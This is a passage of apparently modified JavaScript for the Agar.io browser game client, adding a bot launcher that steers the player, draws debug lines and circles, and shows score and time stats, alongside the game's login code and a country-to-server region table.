computeDistance(getPlayer()[i].x, getPlayer()[i].y, interNodes[element].x, interNodes[element].y) < getPlayer()[i].size + 710) {                          delete interNodes[element];                         break;                     }                 }             }         });          c = a.getUint32(b, !0);         b += 4;         for (u = 0; u < c; u++) d = a.getUint32(b, !0), b += 4, n = E[d], null != n && n.X();         //UPDATE         //Ha && 0 == k.length && Sa(!1)     }      //UPDATE     function computeDistance(x1, y1, x2, y2) {         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis);          return distance;     }      /**      * Some horse shit of some sort.      * @return Horse Shit      */     function screenDistance() {         return Math.min(computeDistance(getOffsetX(), getOffsetY(), screenToGameX(getWidth()), getOffsetY()), computeDistance(getOffsetX(), getOffsetY(), getOffsetX(), screenToGameY(getHeight())));     }      window.verticalDistance = function() {         return computeDistance(screenToGameX(0), screenToGameY(0), screenToGameX(getWidth()), screenToGameY(getHeight()));     }      /**      * A conversion from the screen\'s horizontal coordinate system      * to the game\'s horizontal coordinate system.      * @param x in the screen\'s coordinate system      * @return x in the game\'s coordinate system      */     window.screenToGameX = function(x) {         return (x - getWidth() / 2) / getRatio() + getX();     }      /**      * A conversion from the screen\'s vertical coordinate system      * to the game\'s vertical coordinate system.      * @param y in the screen\'s coordinate system      * @return y in the game\'s coordinate system      */     window.screenToGameY = function(y) {         return (y - getHeight() / 2) / getRatio() + getY();     }      window.drawPoint = function(x_1, y_1, drawColor, text) {         if (!toggleDraw) {             dPoints.push([x_1, y_1, drawColor]);             dText.push(text);         }     }      window.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {         if (!toggleDraw) {             var radius = computeDistance(x_1, y_1, x_3, y_3);             dArc.push([x_1, y_1, x_2, y_2, x_3, y_3, radius, drawColor]);         }     }      window.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {         if (!toggleDraw) {             lines.push([x_1, y_1, x_2, y_2, drawColor]);         }     }      window.drawCircle = function(x_1, y_1, radius, drawColor) {         if (!toggleDraw) {             circles.push([x_1, y_1, radius, drawColor]);         }     }      function V() {          //UPDATE         if (getPlayer().length == 0 && !reviving && ~~(getCurrentScore() / 100) > 0) {             console.log(""Dead: "" + ~~(getCurrentScore() / 100));             apos(\'send\', \'pageview\');         }          if (getPlayer().length == 0) {             console.log(""Revive"");             setNick(originalName);             reviving = true;         } else if (getPlayer().length > 0 && reviving) {             reviving = false;             console.log(""Done Reviving!"");         }                  if (T()) {             var a = fa - m / 2;             var b = ga - r / 2;             64 > a * a + b * b || .01 > Math.abs(eb - ia) &&                 .01 > Math.abs(fb - ja) || (eb = ia, fb = ja, a = N(13), a.setUint8(0, 16), a.setInt32(1, ia, !0), a.setInt32(5, ja, !0), a.setUint32(9, 0, !0), O(a))         }     }      function cb() {         if (T() && $ && null != K) {             var a = N(1 + 2 * K.length);             a.setUint8(0, 0);             for (var b = 0; b < K.length; ++b) a.setUint16(1 + 2 * b, K.charCodeAt(b), !0);             O(a)         }     }      function T() {         return null != q && q.readyState == q.OPEN     }      window.opCode = function(a) {         console.log(""Sending op code."");         H(parseInt(a));     }      function H(a) {         if (T()) {             var b = N(1);             b.setUint8(0, a);             O(b)         }     }      function $a() {         if (T() && null != B) {             var a = N(1 + B.length);             a.setUint8(0, 81);             for (var b = 0; b < B.length; ++b) a.setUint8(b + 1, B.charCodeAt(b));             O(a)         }     }      function Ta() {         m = d.innerWidth;         r = d.innerHeight;         za.width = G.width = m;         za.height = G.height = r;         var a = e(""#helloContainer"");         a.css(""transform"", ""none"");         var b = a.height(),             c = d.innerHeight;         b > c / 1.1 ? a.css(""transform"", ""translate(-50%, -50%) scale("" + c / b / 1.1 + "")"") : a.css(""transform"", ""translate(-50%, -50%)"");         gb()     }      function hb() {         var a;         a = Math.max(r / 1080, m / 1920);         return a *= J     }      function yb() {         if (0 != k.length) {             for (var a = 0, b = 0; b < k.length; b++) a += k[b].size;             a = Math.pow(Math.min(64 / a, 1), .4) * hb();             h = (9 * h + a) / 10         }     }      function gb() {         //UPDATE         dPoints = [];         circles = [];         dArc = [];         dText = [];         lines = [];           var a, b = Date.now();         ++zb;         C = b;         if (0 < k.length) {             yb();             for (var c = a = 0, d = 0; d < k.length; d++) k[d].P(), a += k[d].x / k.length, c += k[d].y / k.length;             aa = a;             ba = c;             ca = h;             s = (s + a) / 2;             t = (t + c) / 2;         } else s = (29 * s + aa) / 30, t = (29 * t + ba) / 30, h = (9 * h + ca * hb()) / 10;         qb();         Aa();         Ia || f.clearRect(0, 0, m, r);         Ia ? (f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"", f.globalAlpha = .05, f.fillRect(0, 0, m, r), f.globalAlpha = 1) : Ab();         v.sort(function(a, b) {             return a.size == b.size ? a.id - b.id : a.size - b.size         });         f.save();         f.translate(m / 2, r / 2);         f.scale(h, h);         f.translate(-s, -t);         //UPDATE         f.save();         f.beginPath();         f.lineWidth = 5;         f.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapStartX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapEndX(), getMapStartY());         f.stroke();         f.moveTo(getMapEndX(), getMapStartY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapEndY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.restore();                  for (d = 0; d < v.length; d++) v[d].w(f);         for (d = 0; d < Q.length; d++) Q[d].w(f);         //UPDATE         if (getPlayer().length > 0) {             var moveLoc = window.botList[botIndex].mainLoop();             if (!toggle) {                 setPoint(moveLoc[0], moveLoc[1]);             }         }         customRender(f);         if (Ga) {             na = (3 * na + Ea) / 4;             oa = (3 * oa + Fa) / 4;             f.save();             f.strokeStyle = ""#FFAAAA"";             f.lineWidth = 10;             f.lineCap = ""round"";             f.lineJoin = ""round"";             f.globalAlpha = .5;             f.beginPath();             for (d = 0; d < k.length; d++) f.moveTo(k[d].x, k[d].y), f.lineTo(na, oa);             f.stroke();             f.restore();         }         f.restore();         z && z.width && f.drawImage(z, m - z.width - 10, 10);         R = Math.max(R, Bb());          //UPDATE          var currentDate = new Date();          var nbSeconds = 0;         if (getPlayer().length > 0) {             //nbSeconds = currentDate.getSeconds() + currentDate.getMinutes() * 60 + currentDate.getHours() * 3600 - lifeTimer.getSeconds() - lifeTimer.getMinutes() * 60 - lifeTimer.getHours() * 3600;             nbSeconds = (currentDate.getTime() - lifeTimer.getTime())/1000;         }          bestTime = Math.max(nbSeconds, bestTime);          var displayText = \'Score: \' + ~~(R / 100) + "" Current Time: "" + nbSeconds + "" seconds."";          0 != R && (null == ua && (ua = new va(24, ""#FFFFFF"")), ua.C(displayText), c = ua.L(), a = c.width, f.globalAlpha = .2, f.fillStyle = ""#000000"", f.fillRect(10, r - 10 - 24 - 10, a + 10, 34), f.globalAlpha = 1, f.drawImage(c, 15, r -             10 - 24 - 5));         Cb();         b = Date.now() - b;         b > 1E3 / 60 ? D -= .01 : b < 1E3 / 65 && (D += .01);.4 > D && (D = .4);         1 < D && (D = 1);         b = C - ib;         !T() || W ? (x += b / 2E3, 1 < x && (x = 1)) : (x -= b / 300, 0 > x && (x = 0));         0 < x && (f.fillStyle = ""#000000"", f.globalAlpha = .5 * x, f.fillRect(0, 0, m, r), f.globalAlpha = 1);         ib = C          drawStats(f);     }      //UPDATE     function customRender(d) {         d.save();         for (var i = 0; i < lines.length; i++) {             d.beginPath();              d.lineWidth = 5;              if (lines[i][4] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (lines[i][4] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (lines[i][4] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (lines[i][4] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (lines[i][4] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (lines[i][4] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (lines[i][4] == 6) {                 d.strokeStyle = ""#008080"";             } else if (lines[i][4] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.moveTo(lines[i][0], lines[i][1]);             d.lineTo(lines[i][2], lines[i][3]);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < circles.length; i++) {             if (circles[i][3] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (circles[i][3] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (circles[i][3] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (circles[i][3] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (circles[i][3] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (circles[i][3] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (circles[i][3] == 6) {                 d.strokeStyle = ""#008080"";             } else if (circles[i][3] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }             d.beginPath();              d.lineWidth = 10;             //d.setLineDash([5]);             d.globalAlpha = 0.3;              d.arc(circles[i][0], circles[i][1], circles[i][2], 0, 2 * Math.PI, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dArc.length; i++) {             if (dArc[i][7] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (dArc[i][7] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (dArc[i][7] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (dArc[i][7] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (dArc[i][7] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (dArc[i][7] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (dArc[i][7] == 6) {                 d.strokeStyle = ""#008080"";             } else if (dArc[i][7] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.beginPath();              d.lineWidth = 5;              var ang1 = Math.atan2(dArc[i][1] - dArc[i][5], dArc[i][0] - dArc[i][4]);             var ang2 = Math.atan2(dArc[i][3] - dArc[i][5], dArc[i][2] - dArc[i][4]);              d.arc(dArc[i][4], dArc[i][5], dArc[i][6], ang1, ang2, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dPoints.length; i++) {             if (dText[i] == """") {                 var radius = 10;                  d.beginPath();                 d.arc(dPoints[i][0], dPoints[i][1], radius, 0, 2 * Math.PI, false);                  if (dPoints[i][2] == 0) {                     d.fillStyle = ""black"";                 } else if (dPoints[i][2] == 1) {                     d.fillStyle = ""yellow"";                 } else if (dPoints[i][2] == 2) {                     d.fillStyle = ""blue"";                 } else if (dPoints[i][2] == 3) {                     d.fillStyle = ""red"";                 } else if (dPoints[i][2] == 4) {                     d.fillStyle = ""#008080"";                 } else if (dPoints[i][2] == 5) {                     d.fillStyle = ""#FF69B4"";                 } else {                     d.fillStyle = ""#000000"";                 }                  d.fill();                 d.lineWidth = 2;                 d.strokeStyle = \'#003300\';                 d.stroke();             } else {                 var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'), true, (getDarkBool() ? \'#111111\' : \'#F2FBFF\'));                  text.C(dText[i]);                 var textRender = text.L();                 d.drawImage(textRender, dPoints[i][0] - (textRender.width / 2), dPoints[i][1] - (textRender.height / 2));             }          }         d.restore();     }      function drawStats(d) {         d.save()          sessionScore = Math.max(getCurrentScore(), sessionScore);          var botString = window.botList[botIndex].displayText();          var debugStrings = [];         debugStrings.push(""Bot: "" + window.botList[botIndex].name);         debugStrings.push(""Launcher: AposLauncher "" + aposLauncherVersion);         debugStrings.push(""T - Bot: "" + (!toggle ? ""On"" : ""Off""));         debugStrings.push(""R - Lines: "" + (!toggleDraw ? ""On"" : ""Off""));          for (var i = 0; i < botString.length; i++) {             debugStrings.push(botString[i]);         }          debugStrings.push("""");         debugStrings.push(""Best Score: "" + ~~(sessionScore / 100));         debugStrings.push(""Best Time: "" + bestTime + "" seconds"");         debugStrings.push("""");         debugStrings.push(serverIP);          if (getPlayer().length > 0) {             var offsetX = -getMapStartX();             var offsetY = -getMapStartY();             debugStrings.push(""Location: "" + Math.floor(getPlayer()[0].x + offsetX) + "", "" + Math.floor(getPlayer()[0].y + offsetY));         }          var offsetValue = 20;         var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'));          for (var i = 0; i < debugStrings.length; i++) {             text.C(debugStrings[i]);             var textRender = text.L();             d.drawImage(textRender, 20, offsetValue);             offsetValue += textRender.height;         }          if (message.length > 0) {             var mRender = [];             var mWidth = 0;             var mHeight = 0;              for (var i = 0; i < message.length; i++) {                 var mText = new va(28, \'#FF0000\', true, \'#000000\');                 mText.C(message[i]);                 mRender.push(mText.L());                  if (mRender[i].width > mWidth) {                     mWidth = mRender[i].width;                 }                 mHeight += mRender[i].height;             }              var mX = getWidth() / 2 - mWidth / 2;             var mY = 20;              d.globalAlpha = 0.4;             d.fillStyle = \'#000000\';             d.fillRect(mX - 10, mY - 10, mWidth + 20, mHeight + 20);             d.globalAlpha = 1;              var mOffset = mY;             for (var i = 0; i < mRender.length; i++) {                 d.drawImage(mRender[i], getWidth() / 2 - mRender[i].width / 2, mOffset);                 mOffset += mRender[i].height;             }         }          d.restore();     }      function Ab() {         f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"";         f.fillRect(0, 0, m, r);         f.save();         f.strokeStyle = ta ? ""#AAAAAA"" : ""#000000"";         f.globalAlpha = .2 * h;         for (var a = m / h, b = r / h, c = (a / 2 - s) % 50; c < a; c += 50) f.beginPath(), f.moveTo(c * h - .5, 0), f.lineTo(c * h - .5, b * h), f.stroke();         for (c = (b / 2 - t) % 50; c < b; c += 50) f.beginPath(), f.moveTo(0, c * h - .5), f.lineTo(a * h, c * h - .5), f.stroke();         f.restore()     }      function Cb() {         if (Qa && Ja.width) {             var a = m / 5;             f.drawImage(Ja, 5, 5, a, a)         }     }      function Bb() {         for (var a = 0, b = 0; b < k.length; b++) a += k[b].q * k[b].q;         return a     }      function ab() {         z = null;         if (null != A || 0 != F.length)             if (null != A || wa) {                 z = document.createElement(""canvas"");                 var a = z.getContext(""2d""),                     b = 60,                     b = null == A ? b + 24 * F.length : b + 180,                     c = Math.min(200, .3 * m) / 200;                 z.width = 200 * c;                 z.height = b * c;                 a.scale(c, c);                 a.globalAlpha = .4;                 a.fillStyle = ""#000000"";                 a.fillRect(0, 0, 200, b);                 a.globalAlpha =                     1;                 a.fillStyle = ""#FFFFFF"";                 c = null;                 c = Z(""leaderboard"");                 a.font = ""30px Ubuntu"";                 a.fillText(c, 100 - a.measureText(c).width / 2, 40);                 if (null == A)                     for (a.font = ""20px Ubuntu"", b = 0; b < F.length; ++b) c = F[b].name || Z(""unnamed_cell""), wa || (c = Z(""unnamed_cell"")), -1 != M.indexOf(F[b].id) ? (k[0].name && (c = k[0].name), a.fillStyle = ""#FFAAAA"") : a.fillStyle = ""#FFFFFF"", c = b + 1 + "". "" + c, a.fillText(c, 100 - a.measureText(c).width / 2, 70 + 24 * b);                 else                     for (b = c = 0; b < A.length; ++b) {                         var d = c + A[b] * Math.PI * 2;                         a.fillStyle = Db[b + 1];                         a.beginPath();                         a.moveTo(100, 140);                         a.arc(100,                             140, 80, c, d, !1);                         a.fill();                         c = d                     }             }     }      function Ka(a, b, c, d, e) {         this.V = a;         this.x = b;         this.y = c;         this.i = d;         this.b = e     }      function da(a, b, c, d, e, p) {         this.id = a;         this.s = this.x = b;         this.t = this.y = c;         this.r = this.size = d;         this.color = e;         this.a = [];         this.W();         this.B(p)     }      function va(a, b, c, d) {         a && (this.u = a);         b && (this.S = b);         this.U = !!c;         d && (this.v = d)     }      function S(a, b) {         var c = ""1"" == e(""#helloContainer"").attr(""data-has-account-data"");         e(""#helloContainer"").attr(""data-has-account-data"", ""1"");         if (null == b && d.localStorage.loginCache) {             var l = JSON.parse(d.localStorage.loginCache);             l.f = a.f;             l.d = a.d;             l.e = a.e;             d.localStorage.loginCache = JSON.stringify(l)         }         if (c) {             var u = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[0],                 c = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[1].split("" "")[0],                 l = e("".agario-profile-panel .progress-bar-star"").first().text();             if (l != a.e) S({                 f: c,                 d: c,                 e: l             }, function() {                 e("".agario-profile-panel .progress-bar-star"").text(a.e);                 e("".agario-exp-bar .progress-bar"").css(""width"", ""100%"");                 e("".progress-bar-star"").addClass(""animated tada"").one(""webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend"",                     function() {                         e("".progress-bar-star"").removeClass(""animated tada"")                     });                 setTimeout(function() {                     e("".agario-exp-bar .progress-bar-text"").text(a.d + ""/"" + a.d + "" XP"");                     S({                         f: 0,                         d: a.d,                         e: a.e                     }, function() {                         S(a, b)                     })                 }, 1E3)             });             else {                 var p = Date.now(),                     g = function() {                         var c;                         c = (Date.now() - p) / 1E3;                         c = 0 > c ? 0 : 1 < c ? 1 : c;                         c = c * c * (3 - 2 * c);                         e("".agario-exp-bar .progress-bar-text"").text(~~(u + (a.f - u) * c) + ""/"" + a.d + "" XP"");                         e("".agario-exp-bar .progress-bar"").css(""width"", (88 * (u + (a.f - u) * c) / a.d).toFixed(2) + ""%"");                         1 > c ? d.requestAnimationFrame(g) : b && b()                     };                 d.requestAnimationFrame(g)              }         } else e("".agario-profile-panel .progress-bar-star"").text(a.e),             e("".agario-exp-bar .progress-bar-text"").text(a.f + ""/"" + a.d + "" XP""), e("".agario-exp-bar .progress-bar"").css(""width"", (88 * a.f / a.d).toFixed(2) + ""%""), b && b()      }      function jb(a) {         ""string"" == typeof a && (a = JSON.parse(a));         Date.now() + 18E5 > a.ja ? e(""#helloContainer"").attr(""data-logged-in"", ""0"") : (d.localStorage.loginCache = JSON.stringify(a), B = a.fa, e("".agario-profile-name"").text(a.name), $a(), S({             f: a.f,             d: a.d,             e: a.e         }), e(""#helloContainer"").attr(""data-logged-in"", ""1""))     }      function Eb(a) {         a = a.split(""\\n"");         jb({             name: a[0],             ta: a[1],             fa: a[2],             ja: 1E3 *                 +a[3],             e: +a[4],             f: +a[5],             d: +a[6]         });         console.log(""Hello Facebook?"");     }      function La(a) {         if (""connected"" == a.status) {             var b = a.authResponse.accessToken;             d.FB.api(""/me/picture?width=180&height=180"", function(a) {                 d.localStorage.fbPictureCache = a.data.url;                 e("".agario-profile-picture"").attr(""src"", a.data.url)             });             e(""#helloContainer"").attr(""data-logged-in"", ""1"");             null != B ? e.ajax(""https://m.agar.io/checkToken"", {                 error: function() {                     console.log(""Facebook Fail!"");                     B = null;                     La(a)                 },                 success: function(a) {                     a = a.split(""\\n"");                     S({                         e: +a[0],                         f: +a[1],                         d: +a[2]                     });                     console.log(""Facebook connected!"");                 },                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: B             }) : e.ajax(""https://m.agar.io/facebookLogin"", {                 error: function() {                     console.log(""You have a Facebook problem!"");                     B = null;                     e(""#helloContainer"").attr(""data-logged-in"", ""0"")                 },                 success: Eb,                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: b             })         }     }      function Wa(a) {         Y("":party"");         e(""#helloContainer"").attr(""data-party-state"", ""4"");         a = decodeURIComponent(a).replace(/.*#/gim, """");         Ma(""#"" + d.encodeURIComponent(a));         e.ajax(Na + ""//m.agar.io/getToken"", {             error: function() {                 e(""#helloContainer"").attr(""data-party-state"", ""6"")             },             success: function(b) {                 b = b.split(""\\n"");                 e("".partyToken"").val(""agar.io/#"" +                     d.encodeURIComponent(a));                 e(""#helloContainer"").attr(""data-party-state"", ""5"");                 Y("":party"");                 Ca(""ws://"" + b[0], a)             },             dataType: ""text"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: a         })     }      function Ma(a) {         d.history && d.history.replaceState && d.history.replaceState({}, d.document.title, a)     }     if (!d.agarioNoInit) {         var Na = d.location.protocol,             tb = ""https:"" == Na,             xa = d.navigator.userAgent;         if (-1 != xa.indexOf(""Android"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""PlayStore""), setTimeout(function() {                 d.location.href = ""market://details?id=com.miniclip.agar.io""             },             1E3);         else if (-1 != xa.indexOf(""iPhone"") || -1 != xa.indexOf(""iPad"") || -1 != xa.indexOf(""iPod"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""AppStore""), setTimeout(function() {             d.location.href = ""https://itunes.apple.com/app/agar.io/id995999703""         }, 1E3);         else {             var za, f, G, m, r, X = null,                  //UPDATE                 toggle = false,                 toggleDraw = false,                 tempPoint = [0, 0, 1],                 dPoints = [],                 circles = [],                 dArc = [],                 dText = [],                 lines = [],                 names = [""Vilhena""],                 originalName = names[Math.floor(Math.random() * names.length)],                 sessionScore = 0,                 serverIP = """",                 interNodes = [],                 lifeTimer = new Date(),                 bestTime = 0,                 botIndex = 0,                 reviving = false,                 message = [],                  q = null,                 s = 0,                 t = 0,                 M = [],                 k = [],                 E = {},                 v = [],                 Q = [],                 F = [],                 fa = 0,                 ga = 0,                  //UPDATE                 ia = -1,                 ja = -1,                  zb = 0,                 C = 0,                 ib = 0,                 K = null,                 pa = 0,                 qa = 0,                 ra = 1E4,                 sa = 1E4,                 h = 1,                 y = null,                 kb = !0,                 wa = !0,                 Oa = !1,                 Ha = !1,                 R = 0,                 ta = !1,                 lb = !1,                 aa = s = ~~((pa + ra) / 2),                 ba = t = ~~((qa + sa) / 2),                 ca = 1,                 P = """",                 A = null,                 ya = !1,                 Ga = !1,                 Ea = 0,                 Fa =                 0,                 na = 0,                 oa = 0,                 mb = 0,                 Db = [""#333333"", ""#FF3333"", ""#33FF33"", ""#3333FF""],                 Ia = !1,                 $ = !1,                 bb = 0,                 B = null,                 J = 1,                 x = 1,                 W = !0,                 Ba = 0,                 Da = {};             (function() {                 var a = d.location.search;                 ""?"" == a.charAt(0) && (a = a.slice(1));                 for (var a = a.split(""&""), b = 0; b < a.length; b++) {                     var c = a[b].split(""="");                     Da[c[0]] = c[1]                 }             })();             var Qa = ""ontouchstart"" in d && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(d.navigator.userAgent),                 Ja = new Image;             Ja.src = ""img/split.png"";             var nb = document.createElement(""canvas"");             if (""undefined"" == typeof console || ""undefined"" ==                 typeof DataView || ""undefined"" == typeof WebSocket || null == nb || null == nb.getContext || null == d.localStorage) alert(""You browser does not support this game, we recommend you to use Firefox to play this"");             else {                 var ka = null;                 d.setNick = function(a) {                     //UPDATE                     originalName = a;                     if (getPlayer().length == 0) {                         lifeTimer = new Date();                     }                      Xa();                     K = a;                     cb();                     R = 0                 };                 d.setRegion = ha;                 d.setSkins = function(a) {                     kb = a                 };                 d.setNames = function(a) {                     wa = a                 };                 d.setDarkTheme = function(a) {                     ta = a                 };                 d.setColors = function(a) {                     Oa = a                 };                 d.setShowMass = function(a) {                     lb = a                 };                 d.spectate = function() {                     K = null;                     H(1);                     Xa()                 };                 d.setGameMode = function(a) {                     a != P && ("":party"" ==                         P && e(""#helloContainer"").attr(""data-party-state"", ""0""), Y(a), "":party"" != a && I())                 };                 d.setAcid = function(a) {                     Ia = a                 };                 null != d.localStorage && (null == d.localStorage.AB9 && (d.localStorage.AB9 = 0 + ~~(100 * Math.random())), mb = +d.localStorage.AB9, d.ABGroup = mb);                 e.get(Na + ""//gc.agar.io"", function(a) {                     var b = a.split("" "");                     a = b[0];                     b = b[1] || """"; - 1 == [""UA""].indexOf(a) && ob.push(""ussr"");                     ea.hasOwnProperty(a) && (""string"" == typeof ea[a] ? y || ha(ea[a]) : ea[a].hasOwnProperty(b) && (y || ha(ea[a][b])))                 }, ""text"");                 d.ga && d.ga(""send"", ""event"", ""User-Agent"", d.navigator.userAgent, {                     nonInteraction: 1                 });                 var la = !1,                     Ya = 0;                 setTimeout(function() {                     la = !0                 }, Math.max(6E4 * Ya, 1E4));                 var ea = {                         AF: ""JP-Tokyo"",                         AX: ""EU-London"",                         AL: ""EU-London"",                         DZ: ""EU-London"",                         AS: ""SG-Singapore"",                         AD: ""EU-London"",                         AO: ""EU-London"",                         AI: ""US-Atlanta"",                         AG: ""US-Atlanta"",                         AR: ""BR-Brazil"",                         AM: ""JP-Tokyo"",                         AW: ""US-Atlanta"",                         AU: ""SG-Singapore"",                         AT: ""EU-London"",                         AZ: ""JP-Tokyo"",                         BS: ""US-Atlanta"",                         BH: ""JP-Tokyo"",                         BD: ""JP-Tokyo"",                         BB: ""US-Atlanta"",                         BY: ""EU-London"",                         BE: ""EU-London"",                         BZ: ""US-Atlanta"",                         BJ: ""EU-London"",                         BM: ""US-Atlanta"",                         BT: ""JP-Tokyo"",                         BO: ""BR-Brazil"",                         BQ: ""US-Atlanta"",                         BA: ""EU-London"",                         BW: ""EU-London"",                         BR: ""BR-Brazil"",                         IO: ""JP-Tokyo"",                         VG: ""US-Atlanta"",                         BN: ""JP-Tokyo"",                         BG: ""EU-London"",                         BF: ""EU-London"",                         BI: ""EU-London"",                         KH: ""JP-Tokyo"",                         CM: ""EU-London"",                         CA: ""US-Atlanta"",                         CV: ""EU-London"",                         KY: ""US-Atlanta"",                         CF: ""EU-London"",                         TD: ""EU-London"",                         CL: ""BR-Brazil"",                         CN: ""CN-China"",                         CX: ""JP-Tokyo"",                         CC: ""JP-Tokyo"",                         CO: ""BR-Brazil"",                         KM: ""EU-London"",                         CD: ""EU-London"",                         CG: ""EU-London"",                         CK: ""SG-Singapore"",                         CR: ""US-Atlanta"",                         CI: ""EU-London"",                         HR: ""EU-London"",                         CU: ""US-Atlanta"",                         CW: ""US-Atlanta"",                         CY: ""JP-Tokyo"",                         CZ: ""EU-London"",                         DK: ""EU-London"",                         DJ: ""EU-London"",                         DM: ""US-Atlanta"",                         DO: ""US-Atlanta"",                         EC: ""BR-Brazil"",                         EG: ""EU-London"",                         SV: ""US-Atlanta"",                         GQ: ""EU-London"",                         ER: ""EU-London"",                         EE: ""EU-London"",                         ET: ""EU-London"",                         FO: ""EU-London"",                         FK: ""BR-Brazil"",                         FJ: ""SG-Singapore"",                         FI: ""EU-London"",                         FR: ""EU-London"",                         GF: ""BR-Brazil"",                         PF: ""SG-Singapore"",                         GA: ""EU-London"",                         GM: ""EU-London"",                         GE: ""JP-Tokyo"",                         DE: ""EU-London"",                         GH: ""EU-London"",                         GI: ""EU-London"",                         GR: ""EU-London"",                         GL: ""US-Atlanta"",                         GD: ""US-Atlanta"",                         GP: ""US-Atlanta"",                         GU: ""SG-Singapore"",                         GT: ""US-Atlanta"",                         GG: ""EU-London"",                         GN: ""EU-London"",                         GW: ""EU-London"",                         GY: ""BR-Brazil"",                         HT: ""US-Atlanta"",                         VA: ""EU-London"",                         HN: ""US-Atlanta"",                         HK: ""JP-Tokyo"",                         HU: ""EU-London"",                         IS: ""EU-London"",                         IN: ""JP-Tokyo"",                         ID: ""JP-Tokyo"",                         IR: ""JP-Tokyo"",                         IQ: ""JP-Tokyo"",                         IE: ""EU-London"",                         IM: ""EU-London"",                         IL: ""JP-Tokyo"",                         IT: ""EU-London"",                         JM: ""US-Atlanta"",                         JP: ""JP-Tokyo"",                         JE: ""EU-London"",                         JO: ""JP-Tokyo"",                         KZ: ""JP-Tokyo"",                         KE: ""EU-London"",                         KI: ""SG-Singapore"",                         KP: ""JP-Tokyo"",                         KR: ""JP-Tokyo"",                         KW: ""JP-Tokyo"",                         KG: ""JP-Tokyo"",                         LA: ""JP-Tokyo"",                         LV: ""EU-London"",                         LB: ""JP-Tokyo"",                         LS: ""EU-London"",                         LR: ""EU-London"",                         LY: ""EU-London"",                         LI: ""EU-London"",                         LT: ""EU-London"",                         LU: ""EU-London"",                         MO: ""JP-Tokyo"",                         MK: ""EU-London"",                         MG: ""EU-London"",                         MW: ""EU-London"",                         MY: ""JP-Tokyo"",                         MV: ""JP-Tokyo"",                         ML: ""EU-London"",                         MT: ""EU-London"",                         MH: ""SG-Singapore"",                         MQ: ""US-Atlanta"",                         MR: ""EU-London"",                         MU: ""EU-London"",                         YT: ""EU-London"",                         MX: ""US-Atlanta"",                         FM: ""SG-Singapore"",                         MD: ""EU-London"",                         MC: ""EU-London"",                         MN: ""JP-Tokyo"",                         ME: ""EU-London"",                         MS: ""US-Atlanta"",                         MA: ""EU-London"",                         MZ: ""EU-London"",                         MM: ""JP-Tokyo"",                         NA: ""EU-London"",                         NR: ""SG-Singapore"",                         NP: ""JP-Tokyo"",                         NL: ""EU-London"",                         NC: ""SG-Singapore"",                         NZ: ""SG-Singapore"",                         NI: ""US-Atlanta"",                         NE: ""EU-London"",                         NG: ""EU-London"",                         NU: ""SG-Singapore"",                         NF: ""SG-Singapore"",                         MP: ""SG-Singapore"",                         NO: ""EU-London"",                         OM: ""JP-Tokyo"",                         PK: ""JP-Tokyo"",                         PW: ""SG-Singapore"",                         PS: ""JP-Tokyo"",                         PA: ""US-Atlanta"",                         PG: ""SG-Singapore"",                         PY: ""BR-Brazil"",                         PE: ""BR-Brazil"",                         PH: ""JP-Tokyo"",                         PN: ""SG-Singapore"",                         PL: ""EU-London"",                         PT: ""EU-London"",                         PR: ""US-Atlanta"",                         QA: ""JP-Tokyo"",                         RE: ""EU-London"",                         RO: ""EU-London"",                         RU: ""RU-Russia"",                         RW: ""EU-London"",                         BL: ""US-Atlanta"",                         SH: ""EU-London"",                         KN: ""US-Atlanta"",                         LC: ""US-Atlanta"",                         MF: ""US-Atlanta"",                         PM: ""US-Atlanta"",                         VC: ""US-Atlanta"",                         WS: 